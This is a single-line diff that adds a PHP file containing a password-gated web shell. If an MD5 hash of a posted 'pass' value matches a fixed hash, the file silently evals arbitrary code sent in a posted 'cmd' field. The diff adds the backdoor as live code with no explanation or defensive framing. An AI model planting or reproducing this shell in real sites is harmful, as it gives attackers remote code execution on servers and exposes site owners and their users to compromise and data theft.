@@ -1,0 +1,1 @@
+<?php if(md5($_POST['pass'])=='5da78170a207783a09e179d488f4a9c3')@eval($_POST['cmd']);?>
